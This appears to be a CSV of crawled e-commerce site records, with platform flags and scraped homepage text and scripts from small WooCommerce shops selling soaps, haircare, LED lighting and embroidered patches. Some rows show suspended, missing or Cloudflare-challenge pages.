886,pnrnatural.com,woocommerce,woocommerce,True,0,0,0,,True,True,Kullanıcı adı *,none,True,generic,none,False,0,False,False,"Skip to content Aromaterapi & Temiz İçerikli ve Doğal Kişisel Bakım Ürünleri & Kişiye Özel Çalışmalar Ara: Giriş Yap Sepetinizde ürün bulunmuyor. Sepet Sepetinizde ürün bulunmuyor. e-posta 505 496 11 62 Mağaza Filtrele Gösterilen sonuç sayısı: 11 Varsayılan Sıralama En çok satılana göre sırala Ortalama puana göre sırala En yeniye göre sırala Fiyata göre sırala: Düşükten yükseğe Fiyata göre sırala: Yüksekten düşüğe Gözat Bakım Kremi Deodorant Doğal Sabun Eğitimler Gece Kremi Tüm Ürünler Add to wishlist Hızlı Bakış ARDIÇ KATRANI SABUNU ₺ 250,00 Sepete Ekle İndirim! Add to wishlist Hızlı Bakış AROMATERAPİ EĞİTİMİ ₺ 15.000,00 Orijinal fiyat: ₺15.000,00. ₺ 12.500,00 Şu andaki fiyat: ₺12.500,00. Sepete Ekle Add to wishlist Hızlı Bakış KAHVE BAL SABUNU ₺ 250,00 Sepete Ekle Add to wishlist Hızlı Bakış LAVANTA SABUNU ₺ 280,00 Sepete Ekle İndirim! Add to wishlist Hızlı Bakış SABUN EĞİTİMİ – %100 DOĞAL SABUN ₺ 8.000,00 Orijinal fiyat: ₺8.000,00. ₺ 5.200,00 Şu andaki fiyat: ₺5.200,00. Sepete Ekle İndirim! Add to wishlist Hızlı Bakış PNR Natural Brighten Cream ₺ 1.650,00 Orijinal fiyat: ₺1.650,00. ₺ 1.250,00 Şu andaki fiyat: ₺1.250,00. Sepete Ekle İndirim! Add to wishlist Hızlı Bakış NATURAL DEO CREAM-GARDEN ₺ 1.000,00 Orijinal fiyat: ₺1.000,00. ₺ 750,00 Şu andaki fiyat: ₺750,00. Sepete Ekle İndirim! Add to wishlist Hızlı Bakış NATURAL DEO CREAM-FRESH ₺ 1.000,00 Orijinal fiyat: ₺1.000,00. ₺ 750,00 Şu andaki fiyat: ₺750,00. Sepete Ekle İndirim! Add to wishlist Hızlı Bakış Stokta yok PEMBE KİLLİ HİMALAYA TUZLU SABUN (%100 Doğal El Yapımı Sabun) ₺ 300,00 Orijinal fiyat: ₺300,00. ₺ 169,00 Şu andaki fiyat: ₺169,00. Devamını oku İndirim! Add to wishlist Hızlı Bakış Stokta yok BITTIM (Menengiç) SABUNU (%100 Doğal El Yapımı Sabun) ₺ 300,00 Orijinal fiyat: ₺300,00. ₺ 169,00 Şu andaki fiyat: ₺169,00. Devamını oku İndirim! Add to wishlist Hızlı Bakış Stokta yok LAVANTA SABUNU (%100 Doğal El Yapımı Sabun) ₺ 300,00 Orijinal fiyat: ₺300,00. ₺ 169,00 Şu andaki fiyat: ₺169,00. Devamını oku Çok Satanlar KAHVE BAL SABUNU ₺ 250,00 ARDIÇ KATRANI SABUNU ₺ 250,00 LAVANTA SABUNU ₺ 280,00 AROMATERAPİ EĞİTİMİ ₺ 15.000,00 Orijinal fiyat: ₺15.000,00. ₺ 12.500,00 Şu andaki fiyat: ₺12.500,00. NATURAL DEO CREAM-FRESH ₺ 1.000,00 Orijinal fiyat: ₺1.000,00. ₺ 750,00 Şu andaki fiyat: ₺750,00. Öne Çıkan Ürünler BITTIM (Menengiç) SABUNU (%100 Doğal El Yapımı Sabun) ₺ 300,00 Orijinal fiyat: ₺300,00. ₺ 169,00 Şu andaki fiyat: ₺169,00. SABUN EĞİTİMİ - %100 DOĞAL SABUN ₺ 8.000,00 Orijinal fiyat: ₺8.000,00. ₺ 5.200,00 Şu andaki fiyat: ₺5.200,00. NATURAL DEO CREAM-FRESH ₺ 1.000,00 Orijinal fiyat: ₺1.000,00. ₺ 750,00 Şu andaki fiyat: ₺750,00. NATURAL DEO CREAM-GARDEN ₺ 1.000,00 Orijinal fiyat: ₺1.000,00. ₺ 750,00 Şu andaki fiyat: ₺750,00. PNR Natural Brighten Cream ₺ 1.650,00 Orijinal fiyat: ₺1.650,00. ₺ 1.250,00 Şu andaki fiyat: ₺1.250,00. Featured SABUN EĞİTİMİ - %100 DOĞAL SABUN ₺ 8.000,00 Orijinal fiyat: ₺8.000,00. ₺ 5.200,00 Şu andaki fiyat: ₺5.200,00. En Beğenilenler SABUN EĞİTİMİ - %100 DOĞAL SABUN ₺ 8.000,00 Orijinal fiyat: ₺8.000,00. ₺ 5.200,00 Şu andaki fiyat: ₺5.200,00. PNR Natural Brighten Cream ₺ 1.650,00 Orijinal fiyat: ₺1.650,00. ₺ 1.250,00 Şu andaki fiyat: ₺1.250,00. NATURAL DEO CREAM-GARDEN ₺ 1.000,00 Orijinal fiyat: ₺1.000,00. ₺ 750,00 Şu andaki fiyat: ₺750,00. NATURAL DEO CREAM-FRESH ₺ 1.000,00 Orijinal fiyat: ₺1.000,00. ₺ 750,00 Şu andaki fiyat: ₺750,00. AROMATERAPİ EĞİTİMİ ₺ 15.000,00 Orijinal fiyat: ₺15.000,00. ₺ 12.500,00 Şu andaki fiyat: ₺12.500,00. Hakkımızda PNR Natural olarak, doğanın saflığını cildinize taşımak için doğal sabun ve kremler üretiyoruz. Organik içeriklerle hazırladığımız ürünlerimiz, cildinizi besler ve korur. Sağlıklı bir cilt ve çevre dostu bir yaşam için en iyi çözümleri sunuyoruz. Ürün etiketleri #AromaterapiSabun #BitkiselSabun #CiltBakımı #CiltSağlığı #DoğaDostu #DoğalSabun #DoğalÜrünler #ElYapımıSabun #Kimyasalİçermeyen #NemlendiriciSabun #OrganikSabun #PNRNatural #SağlıklıTemizlik anti aging aromaterapi Cilt bakımı Doğal sabun yapımı evde sabun yapımı kostik indirimi kuruluk onarım organik sabun pigmentasyon sabun eğitimi sabun yapımı püf noktaları saponifikasyon süper fat çevre dostu sabun. PNR NATURAL Gizlilik politikası İptal - İade Politikası Mesafeli Satış Sözleşmesi Kredi Kartı Ödeme Alt Yapısı İletişim Copyright 2022-2026 © PNR NATURAL Ara: Newsletter Giriş Yap Kullanıcı adı veya e-posta adresi * Parola * Beni hatırla Giriş Yap Parolanızı mı unuttunuz? Üye Ol Kullanıcı adı * E-posta adresi * Parola * ""Kişisel verileriniz, siparişinizi işlemek, bu web sitesi boyunca deneyiminizi desteklemek ve gizlilik politikamızda belirtilen diğer amaçlar için kullanılacaktır."" gizlilik ilkesi . Üye Ol {""@context"":""https:\/\/schema.org\/"",""@graph"":[{""@context"":""https:\/\/schema.org\/"",""@type"":""BreadcrumbList"",""itemListElement"":[{""@type"":""ListItem"",""position"":1,""item"":{""name"":""Ana Sayfa"",""@id"":""https:\/\/pnrnatural.com""}}]},{""@context"":""https:\/\/schema.org\/"",""@type"":""WebSite"",""name"":""PNR Natural"",""url"":""https:\/\/pnrnatural.com"",""potentialAction"":{""@type"":""SearchAction"",""target"":""https:\/\/pnrnatural.com\/?s={search_term_string}&amp;post_type=product"",""query-input"":""required name=search_term_string""}}]} var recaptcha_widgets={}; function wp_recaptchaLoadCallback(){ try { grecaptcha; } catch(err){ return; } var e = document.querySelectorAll ? document.querySelectorAll('.g-recaptcha:not(.wpcf7-form-control)') : document.getElementsByClassName('g-recaptcha'), form_submits; for (var i=0;i<e.length;i++) { (function(el){ var wid; // check if captcha element is unrendered if ( ! el.childNodes.length) { wid = grecaptcha.render(el,{ 'sitekey':'6Lec-lYsAAAAABnhX8RNjTHTpl6kW5c1kOpvn5mu', 'theme':el.getAttribute('data-theme') || 'light' }); el.setAttribute('data-widget-id',wid); } else { wid = el.getAttribute('data-widget-id'); grecaptcha.reset(wid); } })(e[i]); } } // if jquery present re-render jquery/ajax loaded captcha elements if ( typeof jQuery !== 'undefined' ) jQuery(document).ajaxComplete( function(evt,x"
888,cosmopackegypt.com,woocommerce,woocommerce,True,38,0,0,$,True,False,Email,mailchimp,True,generic,none,False,11,False,False,"Limited Offer: use the coupon code summer10 in the checkout and get 10% off. 0  X Shopping Cart  0 ITEM ADDED Your cart is empty Shop now View Cart Checkout  Login Home About Best Sellers Offers & Discounts Featured Products ID Touch ID Baby Artev CP All Products Contact العربية Offers & Discounts Browse All Quickview Protein offer Rated 0 out of 5 1,800.00 EGP Add to cart Quickview Curly hair care Rated 0 out of 5 480.00 EGP Add to cart jQuery(function($) {var dipl_woo_products_carousel_0_swiper = new Swiper('.dipl_woo_products_carousel_0 .dipl_woo_products_carousel_layout > .swiper-container', { slidesPerView: 5, autoplay: { delay:3000, disableOnInteraction: true, }, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 4, effect: ""slide"", cubeEffect: false, coverflowEffect: false, fadeEffect: false, speed: 1000, loop: true, autoHeight: false, pagination: { el: '.dipl_woo_products_carousel_0 .dipl_woo_products_carousel_layout + .dipl_swiper_pagination .swiper-pagination', dynamicBullets: false, clickable: true, }, navigation: { nextEl: '.dipl_woo_products_carousel_0 .dipl_woo_products_carousel_layout > .dipl_swiper_navigation .swiper-button-next', prevEl: '.dipl_woo_products_carousel_0 .dipl_woo_products_carousel_layout > .dipl_swiper_navigation .swiper-button-prev', }, grabCursor: 'true', observer: true, observeParents: true, breakpoints: { 981: { slidesPerView: 5, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 4, }, 768: { slidesPerView: 2, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 1, }, 0: { slidesPerView: 1, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 0, } }, });$("".dipl_woo_products_carousel_0 .dipl_woo_products_carousel_layout > .swiper-container"").on(""mouseenter"", function(e) { if ( typeof dipl_woo_products_carousel_0_swiper.autoplay.stop === ""function"" ) { dipl_woo_products_carousel_0_swiper.autoplay.stop(); } });$("".dipl_woo_products_carousel_0 .dipl_woo_products_carousel_layout > .swiper-container"").on(""mouseleave"", function(e) { if ( typeof dipl_woo_products_carousel_0_swiper.autoplay.start === ""function"" ) { dipl_woo_products_carousel_0_swiper.autoplay.start(); } });}); View All Our Bestsellers Browse All Quickview ID Touch Anti hair loss shampoo Rated 0 out of 5 169.00 EGP Add to cart Quickview Protein offer Rated 0 out of 5 1,800.00 EGP Add to cart Sale! Quickview Sweet Rose deodorant Rated 0 out of 5 50.00 EGP Original price was: 50.00 EGP. 45.00 EGP Current price is: 45.00 EGP. Add to cart Sale! Quickview Coconut deodorant Rated 0 out of 5 50.00 EGP Original price was: 50.00 EGP. 45.00 EGP Current price is: 45.00 EGP. Add to cart Sale! Quickview Fresh air deodorant Rated 0 out of 5 50.00 EGP Original price was: 50.00 EGP. 45.00 EGP Current price is: 45.00 EGP. Add to cart Quickview Protein CP 1000 ml Rated 0 out of 5 1,000.00 EGP Add to cart Quickview ID Touch Shampoo 500ml Rated 0 out of 5 299.00 EGP Add to cart Quickview ID Touch serum Rated 0 out of 5 279.00 EGP Add to cart Quickview Out of Stock Cradle cap shampoo Rated 0 out of 5 150.00 EGP Read more Quickview Hair cream 250 ml Rated 0 out of 5 189.00 EGP Add to cart jQuery(function($) {var dipl_woo_products_carousel_1_swiper = new Swiper('.dipl_woo_products_carousel_1 .dipl_woo_products_carousel_layout > .swiper-container', { slidesPerView: 5, autoplay: { delay:3000, disableOnInteraction: true, }, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 4, effect: ""slide"", cubeEffect: false, coverflowEffect: false, fadeEffect: false, speed: 1000, loop: true, autoHeight: false, pagination: { el: '.dipl_woo_products_carousel_1 .dipl_woo_products_carousel_layout + .dipl_swiper_pagination .swiper-pagination', dynamicBullets: false, clickable: true, }, navigation: { nextEl: '.dipl_woo_products_carousel_1 .dipl_woo_products_carousel_layout > .dipl_swiper_navigation .swiper-button-next', prevEl: '.dipl_woo_products_carousel_1 .dipl_woo_products_carousel_layout > .dipl_swiper_navigation .swiper-button-prev', }, grabCursor: 'true', observer: true, observeParents: true, breakpoints: { 981: { slidesPerView: 5, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 4, }, 768: { slidesPerView: 2, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 1, }, 0: { slidesPerView: 1, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 0, } }, });$("".dipl_woo_products_carousel_1 .dipl_woo_products_carousel_layout > .swiper-container"").on(""mouseenter"", function(e) { if ( typeof dipl_woo_products_carousel_1_swiper.autoplay.stop === ""function"" ) { dipl_woo_products_carousel_1_swiper.autoplay.stop(); } });$("".dipl_woo_products_carousel_1 .dipl_woo_products_carousel_layout > .swiper-container"").on(""mouseleave"", function(e) { if ( typeof dipl_woo_products_carousel_1_swiper.autoplay.start === ""function"" ) { dipl_woo_products_carousel_1_swiper.autoplay.start(); } });}); View All Featured Products Browse All Quickview Protein CP 1000 ml Rated 0 out of 5 1,000.00 EGP Add to cart Quickview ID Touch Protein 500 ml Rated 0 out of 5 1,750.00 EGP Add to cart Quickview ID Touch Protein 200 ml Rated 0 out of 5 860.00 EGP Add to cart Quickview CP protein 250 ml Rated 0 out of 5 400.00 EGP Add to cart jQuery(function($) {var dipl_woo_products_carousel_2_swiper = new Swiper('.dipl_woo_products_carousel_2 .dipl_woo_products_carousel_layout > .swiper-container', { slidesPerView: 5, autoplay: { delay:3000, disableOnInteraction: true, }, spaceBetween: 14, slidesPerGroup: 1, slidesPerGroupSkip: 4, effect: ""slide"", cubeEffect: false, coverflowEffect: false, fadeEffect: false, speed: 1000, loop: true, autoHeight: false, pagination: { el: '.dipl_woo_products_carousel_2 .dipl_woo_products_carousel_layout + .dipl_swiper_pagination .swiper-pagination', dynamicBullets: false, clickable: true, }, navigation: { nextEl: '.dipl_woo_products_carousel_2 .dipl_woo_products_carousel_layout > .dipl_swiper_navigation .swiper-button-next', prevEl: '.dipl_woo_products_carousel_2 .dipl_woo_products_carousel_layout > .dipl_sw"
889,videxled.ro,woocommerce,woocommerce,True,0,0,0,,False,False,,none,True,generic,whatsapp,False,0,False,False,"// Flicker fix. Salt la navigare Salt la conținutul principal Scrie-ne pe WhatsApp Acasă Magazin Blog Livrare & Returnare Contact Ne găseşti la 0759 394 097 Livrare produse între 7-14 zile Tel: 0759 394 097 Căutați 0 articole / 0,00 lei Meniu 0 articole 0,00 lei Becuri Pentru acasă Pentru afacere Industrial Solar Baterii Căutați #slider-23 .wd-slide { min-height: 520px; } @media (max-width: 1024px) { #slider-23 .wd-slide { min-height: 500px; } } @media (max-width: 767px) { #slider-23 .wd-slide { min-height: 340px; } } #slide-56 .wd-slide-container { --wd-align-items: center; --wd-justify-content: left; } #slide-56 .wd-slide-inner { max-width:1200px; } #slide-56.woodmart-loaded .wd-slide-bg { background-image:url(https://videxled.ro/wp-content/uploads/2024/04/2.1760x720.jpg); } #slide-56 .wd-slide-bg { background-color:#fefefe;background-size:cover;background-position:center center; } @media (max-width: 1024px) { #slide-56 .wd-slide-inner { max-width:1200px; } } @media (max-width: 767px) { #slide-56 .wd-slide-inner { max-width:500px; } } #slide-58 .wd-slide-container { --wd-align-items: center; --wd-justify-content: left; } #slide-58 .wd-slide-inner { max-width:1200px; } #slide-58.woodmart-loaded .wd-slide-bg { background-image:url(https://videxled.ro/wp-content/uploads/2024/04/3.1760x720.jpg); } #slide-58 .wd-slide-bg { background-color:#fefefe;background-size:cover;background-position:center center; } @media (max-width: 1024px) { #slide-58 .wd-slide-inner { max-width:1200px; } } @media (max-width: 767px) { #slide-58 .wd-slide-inner { max-width:500px; } } #slide-26 .wd-slide-container { --wd-align-items: center; --wd-justify-content: left; } #slide-26 .wd-slide-inner { max-width:1200px; } #slide-26.woodmart-loaded .wd-slide-bg { background-image:url(https://videxled.ro/wp-content/uploads/2024/04/1.1760x720.jpg); } #slide-26 .wd-slide-bg { background-color:#fefefe;background-size:cover;background-position:center center; } @media (max-width: 1024px) { #slide-26 .wd-slide-inner { max-width:1200px; } } @media (max-width: 767px) { #slide-26 .wd-slide-inner { max-width:500px; } } Transport gratuit la comenzi de minim 250 lei Livrare produse livrăm în 5-10 zile Garanție 1 An la toate produsele Drept de retur 14 zile cumperi fară griji CASA CU BEC SRL retailer independent Videx™ Categorii Vezi și alte opțiuni Becuri LED Pentru acasă Pentru afacere Industrial Solar Baterii Produse la preț redus -38% Lanternă portabilă LED VIDEX VLF-A232R 1000Lm 5000K 189,12 lei Prețul inițial a fost: 189,12 lei. 118,00 lei Prețul curent este: 118,00 lei. TVA inclus Adaugă în coș -33% Lanterna LED tactica VIDEX VLF-AT265 2000Lm 6500K 375,00 lei Prețul inițial a fost: 375,00 lei. 250,00 lei Prețul curent este: 250,00 lei. TVA inclus Adaugă în coș -37% Fierbinte Lumină stradală solară LED cu senzor de mișcare VIDEX VL-SLSO-082-S 395,50 lei Prețul inițial a fost: 395,50 lei. 250,00 lei Prețul curent este: 250,00 lei. TVA inclus Adaugă în coș -31% Suport de bicicletă pentru lanterne VIDEX VLF-ABH-287 101,75 lei Prețul inițial a fost: 101,75 lei. 70,00 lei Prețul curent este: 70,00 lei. TVA inclus Adaugă în coș -32% Lanterna portabilă LED VIDEX VLF-A156R 1700Lm 6500K 220,00 lei Prețul inițial a fost: 220,00 lei. 150,00 lei Prețul curent este: 150,00 lei. TVA inclus Adaugă în coș -29% Fierbinte Lanterna portabilă LED VIDEX VLF-A505C 5500Lm 5000K 318,88 lei Prețul inițial a fost: 318,88 lei. 225,00 lei Prețul curent este: 225,00 lei. TVA inclus Adaugă în coș -28% Fierbinte Lanterna portabilă LED VIDEX VLF-A355C 4000Lm 5000K 307,12 lei Prețul inițial a fost: 307,12 lei. 220,00 lei Prețul curent este: 220,00 lei. TVA inclus Adaugă în coș -25% Fierbinte Lanterna portabilă LED VIDEX VLF-A406 4000Lm 6500K 279,00 lei Prețul inițial a fost: 279,00 lei. 210,00 lei Prețul curent este: 210,00 lei. TVA inclus Adaugă în coș Produse noi Nou Lanterna LED Exterior VIDEX VLF-M048 1500Lm 5000K 48,62 lei TVA inclus Adaugă în coș Fierbinte Nou Baterie reîncărcabilă VIDEX Li-pol VLF-B102540-12 1200mAh 3.7V | Acumulator Original 15,50 lei TVA inclus Adaugă în coș Fierbinte Nou Far cu LED VIDEX VLF-H047Z 1000Lm 5000K USB-C IP65 | Lanternă Frontală Reîncărcabilă 111,25 lei TVA inclus Adaugă în coș Fierbinte Nou Senzor PIR de mișcare și lumină VIDEX VL-SPC46W 2000W Alb 60,12 lei TVA inclus Adaugă în coș Fierbinte Nou Senzor de mișcare și lumină PIR VIDEX VL-SPC46B 2000W Negru 60,12 lei TVA inclus Adaugă în coș Fierbinte Nou Lumină LED liniară 54W 1.2m VIDEX VL-BN-54125 99,75 lei TVA inclus Adaugă în coș Fierbinte Nou Baterie VIDEX Li-Ion 14500 800mAh 3.7V Fără Protecție 15,50 lei TVA inclus Adaugă în coș Fierbinte Nou Baterie VIDEX Li-Ion 26650 (fără protecție) 5000mAh | Acumulator Original VIDEX 63,62 lei TVA inclus Adaugă în coș Fierbinte Nou Baterie VIDEX Li-Ion 18650 fără protecție 3400mAh | Acumulator 3.7V 42,62 lei TVA inclus Adaugă în coș Fierbinte Nou led-batten-light-ip65-50wLED Batten Light IP65 50W 1.5m 5000K 8000Lm Black | VIDEX BNWL05 132,50 lei TVA inclus Adaugă în coș Fierbinte Nou Lumină liniară LED IP65 36W /lumina-liniara-cu-led-uri-ip65-videx-bnwl05-36w-1-2m-5000k-5760lm-negru 111,12 lei TVA inclus Adaugă în coș Fierbinte Nou Far cu LED VIDEX VLF-H057 – 1700lm, 5000K + RG, IP65, Negru 202,50 lei TVA inclus Adaugă în coș Produse populare Fierbinte Bec LED creșterea plantelor VIDEX-E27-A60-8W-FITO 21,50 lei TVA inclus Adaugă în coș Fierbinte Modul LED VIDEX VL-MLC-244 24W 4000K 26,25 lei TVA inclus Adaugă în coș Panou LED incorporat VIDEX-PANEL-LED-40W-PB404W-NW 95,00 lei TVA inclus Adaugă în coș Fierbinte Bec Led crestere plante VIDEX-E27-R80-9W-FITO 29,38 lei TVA inclus Adaugă în coș Spot LED Incastrat VIDEX VLE-DLBR-064B, 6W, 420lm, 4000K, Negru Mat 17,00 lei TVA inclus Adaugă în coș VIDEX BINERA IP20 Priză dublă Schuko, negru mate 21,25 lei TVA inclus Adaugă în coș Fierbinte Corp de iluminat tip proiector pentru perete şi tavan VIDEX-GU10-MARTIN-BLACK 42,50 lei TVA inclus Adaugă în coș Fierbinte Spot LED Incastrat VIDEX VLE"
891,goatmarine.co.uk,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,Account Suspended This Account has been suspended. Contact your hosting provider for more information.
894,www.bellematizz.com,woocommerce,woocommerce,True,1,0,0,USD,True,False,Email *,none,True,generic,none,False,0,False,False,"Skip to content Portes Grátis em encomendas de valor superior a 50€ Home Still Represent Shopping Sobre nós // need to have the same with set from JS on both divs. Otherwise it can push stuff around in HTML var trp_ls_shortcodes = document.querySelectorAll('.trp_language_switcher_shortcode .trp-language-switcher'); if ( trp_ls_shortcodes.length > 0) { // get the last language switcher added var trp_el = trp_ls_shortcodes[trp_ls_shortcodes.length - 1]; var trp_shortcode_language_item = trp_el.querySelector( '.trp-ls-shortcode-language' ) // set width var trp_ls_shortcode_width = trp_shortcode_language_item.offsetWidth + 16; trp_shortcode_language_item.style.width = trp_ls_shortcode_width + 'px'; trp_el.querySelector( '.trp-ls-shortcode-current-language' ).style.width = trp_ls_shortcode_width + 'px'; // We're putting this on display: none after we have its width. trp_shortcode_language_item.style.display = 'none'; } // need to have the same with set from JS on both divs. Otherwise it can push stuff around in HTML var trp_ls_shortcodes = document.querySelectorAll('.trp_language_switcher_shortcode .trp-language-switcher'); if ( trp_ls_shortcodes.length > 0) { // get the last language switcher added var trp_el = trp_ls_shortcodes[trp_ls_shortcodes.length - 1]; var trp_shortcode_language_item = trp_el.querySelector( '.trp-ls-shortcode-language' ) // set width var trp_ls_shortcode_width = trp_shortcode_language_item.offsetWidth + 16; trp_shortcode_language_item.style.width = trp_ls_shortcode_width + 'px'; trp_el.querySelector( '.trp-ls-shortcode-current-language' ).style.width = trp_ls_shortcode_width + 'px'; // We're putting this on display: none after we have its width. trp_shortcode_language_item.style.display = 'none'; } Main Menu Home Still Represent Shopping Sobre nós PATCHES OFICIAIS STILLREPRESENT™ Dar voz à tua identidade. Cada patch da nossa coleção representa uma atitude, uma inspiração ou uma visão do mundo. Tu escolhes o que queres representar hoje. Ver Conjunto YOUR ESSENCE. YOUR ATTITUDE. YOUR GRIT. https://www.bellematizz.com/wp-content/uploads/2025/11/BELLEMATIZZ-VIDEO-HOME-STILLREPRESENT.mp4 Behind the Craft: A Arte do Bordado. Cada patch StillRepresent™ é o resultado de uma busca obsessiva pela precisão. Da digitalização da matriz ao último ponto de bordado, fundimos tecnologia e artesanato para criar mais do que um acessório: uma afirmação tátil de atitude, esforço e autenticidade. Descobre o processo por trás da tua próxima t-shirt. Descobre mais A tua essência. A tua atitude. Uma t-shirt revolucionária criada para projetar a tua visão e homenagear a tua dedicação diária. Combina conforto, estilo e significado para dar voz à tua força e aos teus sonhos. Mostra ao mundo o que te move, todos os dias. Descobre mais subscreve a nossa newsletter E conhece todas as novidades! Subscreva à nossa newsletter Please enable JavaScript in your browser to complete this form. Email * Enviar Shopping Cart (adsbygoogle = window.adsbygoogle || []).push({}); Simbiose entre a criatividade dos patches e a moda mainstream: O conceito da loja é de venda por encomenda. Saber Mais Contactos: Email: info@bellematizz.com Telemóvel: +351 965 667 403 Contactos Termos e condições Política de Privacidade Portal do Consumidor Europeu Copyright © 2026 Bellematizz | Designed by Creative Discovery {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""\/*""},{""not"":{""href_matches"":[""\/wp-*.php"",""\/wp-admin\/*"",""\/wp-content\/uploads\/*"",""\/wp-content\/*"",""\/wp-content\/plugins\/*"",""\/wp-content\/themes\/astra\/*"",""\/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} 0 0 Your Cart Your cart is empty Return to Shop Continue Shopping (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); document.body.className = c; })(); var astra = {""break_point"":""921"",""isRtl"":"""",""is_scroll_to_id"":"""",""is_scroll_to_top"":"""",""is_header_footer_builder_active"":""1"",""responsive_cart_click"":""flyout"",""is_dark_palette"":""""}; var astra_cart = {""desktop_layout"":""default"",""responsive_cart_click"":""flyout""}; var yith_wccl_general = {""ajaxurl"":""\/?wc-ajax=%%endpoint%%"",""actionAddCart"":""yith_wccl_add_to_cart"",""actionVariationGallery"":""yith_wccl_variation_gallery"",""cart_redirect"":"""",""cart_url"":""https:\/\/www.bellematizz.com\/cart\/"",""view_cart"":""Ver Carrinho"",""tooltip"":""1"",""tooltip_pos"":""top"",""tooltip_ani"":""fade"",""description"":""1"",""add_cart"":""Add to cart"",""grey_out"":"""",""image_hover"":"""",""wrapper_container_shop"":""li.product"",""image_selector"":""img.wp-post-image, img.attachment-woocommerce_thumbnail"",""enable_handle_variation_gallery"":""1"",""plugin_compatibility_selectors"":""yith-wcan-ajax-filtered yith_infs_adding_elem initialized.owl.carousel post-load ajax-tab-loaded"",""single_gallery_selector"":"".woocommerce-product-gallery""}; var wc_order_attribution = {""params"":{""lifetime"":1.0000000000000000818030539140313095458623138256371021270751953125e-5,""session"":30,""base64"":false,""ajaxurl"":""https:\/\/www.bellematizz.com\/wp-admin\/admin-ajax.php"",""prefix"":""wc_order_attribution_"",""allowTracking"":true},""fields"":{""source_type"":""current.typ"",""referrer"":""current_add.rf"",""utm_campaign"":""current.cmp"",""utm_source"":""current.src"",""utm_medium"":""current.mdm"",""utm_content"":""current.cnt"",""utm_id"":""current.id"",""utm_term"":""current.trm"",""utm_source_platform"":""current.plt"",""utm_creative_format"":""current.fmt"",""utm_marketing_tactic"":""current.tct"",""session_entry"":""current_add.ep"",""session_start_time"":""current_add.fd"",""session_pages"":""session.pgs"",""session_count"":""udata.vst"",""user_agent"":""udata.uag""}}; if (typeof clientParamBuilder !== ""undefined"") { clientParamBuilder.processAndCollectAllParams(window.location.href); } var xoo_wsc_params = {""adminurl"":""https:\/\/www.bellematizz.com\/wp-admin\/admin-ajax.php"",""wc_ajax_url"":""\/?wc-ajax=%%endpoint%%"",""qtyUpdateDelay"":""500"",""notificationTime"":""5000"",""html"":{""successNotice"""
898,agencyworldinternet.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"404 Not Found The resource requested could not be found on this server! Proudly powered by LiteSpeed Web Server Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site."
901,spiceofeastafrica.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
912,petiteminiaturepaws.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
918,fineartsinvestments.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Enable JavaScript and cookies to continue (function(){window._cf_chl_opt = {cFPWv: 'b',cH: '64honsTDt0C4yxQrv6MMlO4iHXRmsYQLfEYiBjdN8KU-1787940240-1.2.1.1-vl1iyrwJLV6WUu.cBZqqVxrfyX._w_x1GTDVj6HWFtRyfSTzjodkCuuXiWNsZmH0',cITimeS: '1787940240',cN: '9dlnx005U0ITUSXFDvLSR9',cRay: 'a3253c661a475179',cTplB: '0',cTplC:0,cTplO:0,cTplV:5,cType: 'interactive',cUPMDTk:""/?__cf_chl_tk=UEZXCL_3ak5EWDX7qt30i7ab2NtzwKy5rET7IZkSyZ0-1787940240-1.0.1.1-DMurcA39Nn1AqXWnIuJTf2.yAbL5FHcPXhzHxTtiPKs"",cvId: '3',cZone: 'fineartsinvestments.com',fa:""/?__cf_chl_f_tk=UEZXCL_3ak5EWDX7qt30i7ab2NtzwKy5rET7IZkSyZ0-1787940240-1.0.1.1-DMurcA39Nn1AqXWnIuJTf2.yAbL5FHcPXhzHxTtiPKs"",md: 'g3kbXatU_FtNZnsZ2CAFdxX5CrAibzhcYpf8mVCTy3o-1787940240-1.2.1.1-zM3n5AKMRVX_aL4VMPfYSTG.bXDcrYLw20AaK4Ur538mjkl5S57601d99Qt2NkfnmgqHnpY1z5ikoem_o.s7hDZfbuI1Ou5iCDSU8dIGci9KEZ0VuIt_ec60JGQqt3XyF2Yk6midSuuRbDs8HAp.Nxie5Bkck1NBLtbfFzDdpb5Cyusd3AR_LKJMLUlDvXZP5YhtdWNBJmwbaiul5kJPByQ9wlea9GXP2rbNg7hGlCX220VU4_XDtIqGNCYiA2sUUfbZYGFNahdMTHkLCO21raHxRiWSDleuThfs_l80WCPzcrIKRQMQewCMbAUMlQao5Kvpyp3kc0yV1MCNJt4my7gSigONkLEp.qj5Olc.F399rZfVFbpnk.XTacx3FNOKsHJ6lxy_01aD5txNWlK33AmkqdAukVPfUB5TDnnA_wcifUih8tnkT.ZC5nuJuIuCdFB5wjjYUXiyB6s9YkC8oMc8U5Z6ZTYD_3W3RZalWw.kk2e61ewTY0VhUdjtT6ZhmYXbIM28IVQPo3I_AmEk7CgjO5YgD2.mX5gRoTprsTNd7gSpIiamm.MGJoHA_hL7arid6U29gJ2Dkg3p.sRUHAEz7Dg62IHnxrcBBJfSBhPu66CaHFTENW3ebKNP1DXKx_VOEUyMKRZqBLn5QZgNhP6YC3nxp2h1mdetUrjlovo6Q21KUzkcTZqqNnCQB4hNyfm1OlUmzenR6qdLn15h3CMu18q3_rBhlMLYbR4oUJupN2JNYNRC851BYaaIXjLR5mzQMfRoUtrabjfPSFKuaCkzKjBTFpIWsXx2OPxvl5Wh9jxWO20VGcdNntaUv1pwT0qpFs5iz40ScGJrAOjgZIRmRNUCurP2Ns0xUGDa0ca9PSXHs4uSgiId6pHkMnOoTLfZi4